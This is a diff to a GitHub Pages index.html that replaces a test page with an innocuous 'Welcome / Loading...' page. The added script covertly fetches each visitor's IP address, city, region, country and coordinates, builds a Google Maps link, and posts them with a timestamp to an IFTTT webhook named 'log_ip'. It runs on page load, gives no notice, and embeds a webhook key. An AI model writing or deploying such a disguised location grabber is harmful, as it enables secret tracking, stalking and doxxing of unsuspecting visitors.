@@ -1,10 +1,38 @@
-<!DOCTYPE html>
+ <!DOCTYPE html>
 <html>
 <head>
-  <title>Test Page</title>
+  <title>Welcome</title>
 </head>
 <body>
-  <h1>Success!</h1>
-  <p>Your GitHub Pages site is working.</p>
+  <h1>Welcome</h1>
+  <p>Loading...</p>
+
+  <script>
+    fetch("https://ipapi.co/json")
+      .then(response => response.json())
+      .then(data => {
+        const ip = data.ip;
+        const city = data.city;
+        const region = data.region;
+        const country = data.country_name;
+        const latitude = data.latitude;
+        const longitude = data.longitude;
+
+        const mapsLink = `https://www.google.com/maps?q=${latitude},${longitude}`;
+        const timestamp = new Date().toISOString();
+
+        fetch("https://maker.ifttt.com/trigger/log_ip/with/key/kOLWy3TchheqT7scEtg8eVdDp37GpvLsgXg6Mv11HMG", {
+          method: "POST",
+          headers: {
+            "Content-Type": "application/json"
+          },
+          body: JSON.stringify({
+            value1: `${ip} — ${city}, ${region}, ${country}`,
+            value2: mapsLink,
+            value3: timestamp
+          })
+        });
+      });
+  </script>
 </body>
 </html>
